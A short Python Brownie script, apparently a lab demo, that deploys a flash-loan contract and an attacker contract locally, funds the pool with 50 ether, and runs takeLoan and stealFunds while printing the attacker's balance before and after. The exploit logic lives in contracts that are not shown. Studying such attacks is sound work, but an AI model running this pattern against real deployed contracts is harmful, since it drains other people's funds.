from brownie import FlashLoanDeFi, Borrow, accounts, network
from brownie.network.state import TxHistory


def main():
    owner = accounts[0]
    attacker = accounts[3]

    flash_loan = FlashLoanDeFi.deploy({"from": owner})
    borrow = Borrow.deploy({"from": attacker})

    flash_loan.deposit({"from": owner, "value": "50 ether"})

    breakpoint()

    print(f"your balance before attack: {borrow.balance()}")
    borrow.takeLoan(flash_loan, 20e18)
    borrow.stealFunds(flash_loan)
    print(f"your balance after attack: {borrow.balance()}")
    # flash_loan.balances(borrow)

    network.close()
